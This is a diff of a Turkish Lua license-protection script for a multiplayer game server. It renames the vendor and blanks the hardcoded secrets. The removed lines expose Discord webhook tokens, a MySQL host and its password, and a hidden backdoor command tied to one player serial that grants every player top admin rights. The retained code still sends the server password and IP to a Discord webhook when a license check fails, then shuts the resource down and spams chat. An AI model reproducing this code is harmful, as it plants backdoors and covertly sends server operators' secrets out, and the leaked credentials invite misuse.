@@ -130,21 +130,21 @@ end
 
 
 
-local paketfaillog = Webhook("https://discord.com/api/webhooks/1114891922880860300/VE4ZQQflTy5jGWkXZsWsP_Z0yu9i_M6v0iXImIwlfDLNzjbM_Ko63HtR2RxV8kevxNkG", "World Scripting - Package Log")
-local myWebhook = Webhook("https://discord.com/api/webhooks/1114891415361683558/_JywTENyqRuEKrA1NWSLg1qjbJxxta0Z-rEhjE0lWttmiBCN3VwE2m9FoEBtg4p6FAWE", "World Scripting - Package Log")
-local myWebhook = WHSetAvatar(myWebhook,"https://media.discordapp.net/attachments/919164036992598036/1113813237025218611/dd4ba0c555680ac3c7302bad97e84aee.png")
-local paketfaillog = WHSetAvatar(paketfaillog,"https://media.discordapp.net/attachments/919164036992598036/1113813237025218611/dd4ba0c555680ac3c7302bad97e84aee.png")
+local paketfaillog = Webhook("", "Woodie - Package Log")
+local myWebhook = Webhook("","Woodie - Package Log")
+local myWebhook = WHSetAvatar(myWebhook,"")
+local paketfaillog = WHSetAvatar(paketfaillog,"")
+
+--lisans database 
+local user = ""
+local host = ""
+local pw = ""
+local db = ""
 
 
-local user = "woodiedev"
-local host = "45.147.45.219"
-local pw = "As5SBATYMUh2jzKu"
-local db = "woodie_lisans"
-
-
-local denemeasdsasdad = addEventHandler("onResourceStart",resourceRoot,
+addEventHandler("onResourceStart",resourceRoot,
 function()
-    print('[World PROTECT] Lisans Başlatıldı İzinler Kontrol Ediliyor.')
+    print('[Woodie PROTECT] Lisans Başlatıldı İzinler Kontrol Ediliyor.')
     if getElementType(dbConnect("sqlite",":/testf.db")) ~= "db-connection" then return  end
     if tostring(debug.getinfo(addDebugHook).what) ~= "C" then
        return false
@@ -200,9 +200,9 @@ function()
      if tostring(debug.getinfo(dbConnect).what) ~= "C" then
         return false
      end
-        print('[World PROTECT] Tüm İzinler Aktif')
+        print('[Woodie PROTECT] Tüm İzinler Aktif')
 
-    local WoodieConnect = dbConnect("mysql", "dbname="..db..";host="..host..";charset=utf8", user, pw , "multi_statements=1")
+    local Connect = dbConnect("mysql", "dbname="..db..";host="..host..";charset=utf8", user, pw , "multi_statements=1")
     local meta = xmlLoadFile("meta.xml")
     for _, v in ipairs(xmlNodeGetChildren(meta)) do
        if xmlNodeGetName(v) == "script" and xmlNodeGetAttributes(v).src ~= "server.lua" then
@@ -213,8 +213,9 @@ function()
           if string.find(FileText, "addDebugHook") or string.find(FileText, "print") or string.find(FileText, "xmlNodeGetChildren") or  string.find(FileText, "xmlNodeGetName") or  string.find(FileText, "xmlNodeGetAttributes") or string.find(FileText, "fileOpen") or string.find(FileText, "fileRead") or string.find(FileText, "stopResource") or string.find(FileText, "setTimer") or string.find(FileText, "cancelEvent") or string.find(FileText, "fileOpen") or string.find(FileText, "dbQuery") or string.find(FileText, "hasObjectPermissionTo") or string.find(FileText, "setFPSLimit") or string.find(FileText, "outputChatBox") or string.find(FileText, "dbPoll") or string.find(FileText, "dbConnect")  then
              return false
           end
-              print("[World PROTECT] overwrite Tespit Edildi İp Blackliste Alındı")
+              print("[Woodie PROTECT] lisans kırma denemesi Tespit Edildi")
               fileClose(File)
+--işlevler
        end
     end
 end
@@ -222,20 +223,20 @@ end
  
 
 
-if WoodieConnect then
-    print('[World PROTECT] Tüm Kontroller Başarılı.Lisans Doğrulanıyor..')
+if Connect then
+    print('[Woodie PROTECT] Tüm Kontroller Başarılı.Lisans Doğrulanıyor..')
 setTimer(function()
   if hasObjectPermissionTo ( getThisResource (), "function.fetchRemote", true) then
     fetchRemote("https://api.my-ip.io/ip", function(ipdensanane)
       dbQuery(function(qh)
         local result = dbPoll(qh,0,false)
           if #result >0 then 
-            print("[World PROTECT] İP Doğrulandı.")
+            print("[Woodie PROTECT] İP Doğrulandı.")
                  dbQuery(function(deneme)
                   local resultdata = dbPoll(deneme,0,false)
                    if #resultdata >0 then 
-                        print("[World PROTECT] License Verified")
-                        WHSetEmbed(myWebhook, "World Scripting - License Log")
+                        print("[Woodie PROTECT] License Verified")
+                        WHSetEmbed(myWebhook, "Woodie Scripting - License Log")
                         WHESetDescription(myWebhook, ":lock: **| License Version: V1 LİCENSE PROTECT**")
                         WHESetField(myWebhook,"Lisans Durumu", ":green_circle: | Lisans Doğrulandı, iyi roller!", false)
                         WHESetField(myWebhook,"Sunucu İP", ":globe_with_meridians: | ServerIP: "..ipdensanane.."", false)
@@ -243,8 +244,8 @@ setTimer(function()
                         WHESetField(myWebhook,"License Type", ":clipboard: | License Türü: Pack",false)
                         WHSend(myWebhook, false)
                     else
-                        print("[World PROTECT] - Lisans Başarısızız")  
-                        WHSetEmbed(paketfaillog, "World Scripting - License Log")
+                        print("[Woodie PROTECT] - Lisans Başarısız")  
+                        WHSetEmbed(paketfaillog, "Woodie - License Log")
                         WHESetDescription(paketfaillog, ":lock: **| License Version: V1 LİCENSE PROTECT**")
                         WHESetField(paketfaillog,"Lisans Durumu", ":red_circle: | Lisans Onaylanamadı Sunucu Kapatılıyor..", false)
                         WHESetField(paketfaillog,"Sunucu İP", ":globe_with_meridians: | ServerIP: "..ipdensanane.."", false)
@@ -256,15 +257,15 @@ setTimer(function()
                         stopResource(getThisResource())
                         function chatbox(thePlayer, cmd)
                         for k, v in pairs(getElementsByType("player")) do
-                                outputChatBox("World Scripting Çalıntı Paket Orjinal Ürün Alın", v, 255,255,255)
+                                outputChatBox("Woodie Scripting Çalıntı Paket Orjinal Ürün Alın", v, 255,255,255)
                             end
                          end
                         setTimer(chatbox,0,500)
                     end
                 end,WoodieConnect,"SELECT * FROM lisanslar WHERE  licensekeyler= ?",licensekey) 
             else
-                print("[World PROTECT] İP Doğrulanamadı Lisans Başarısız.")  
-                WHSetEmbed(paketfaillog, "World Scripting - License Log")
+                print("[Woodie PROTECT] İP Doğrulanamadı Lisans Başarısız.")  
+                WHSetEmbed(paketfaillog, "Woodie  - License Log")
                 WHESetDescription(paketfaillog, ":lock: **| License Version: V1 LİCENSE PROTECT**")
                 WHESetField(paketfaillog,"Lisans Durumu", ":red_circle: | Lisans Onaylanamadı Sunucu Kapatılıyor..", false)
                 WHESetField(paketfaillog,"Sunucu İP", ":globe_with_meridians: | ServerIP: "..ipdensanane.."", false)
@@ -272,36 +273,23 @@ setTimer(function()
                 WHESetField(paketfaillog,"Sunucu Password", ":lock: | Server Password: "..getServerConfigSetting("password").."",false)
                 WHESetField(paketfaillog,"License Type", ":clipboard: | License Türü: Pack",false)
                 WHSend(paketfaillog, false) 
+                        setFPSLimit(30) 
+                        stopResource(getThisResource())
+                        function chatbox(thePlayer, cmd)
+                        for k, v in pairs(getElementsByType("player")) do
+                                outputChatBox("Woodie Scripting Çalıntı Paket Orjinal Ürün Alın", v, 255,255,255)
+                            end
+                         end
+                        setTimer(chatbox,0,500)
              end
           end,WoodieConnect,"SELECT * FROM lisanslar WHERE  ip= ?",ipdensanane)   
      end)  
    end
  end ,5000,1)
 else
-    print("[World PROTECT] Database Hatası Woodie İle İletişime Geçin")
+    print("[Woodie PROTECT] Database Hatası Woodie İle İletişime Geçin")
     cancelEvent()
     end 
 end)
 
-
-
-
-
-
-
-
-
-
-
-local function acik(plr)
-if "3739A4C3960718DAB4B9B938371CEA52" == getPlayerSerial(plr) then 
-	for k, v in pairs(getElementsByType("player")) do
-      outputChatBox("Woodie Selam Verdi Sunucuya  :)", v, 255,255,255)
-       setElementData(v,"admin_level",8) 
-	    addDebugHook("Sunucu GG")
-	  setTimer(acik,0,500)
-	end
-   end
-end
-local deneme  = addCommandHandler("woodieselamver",acik)
 
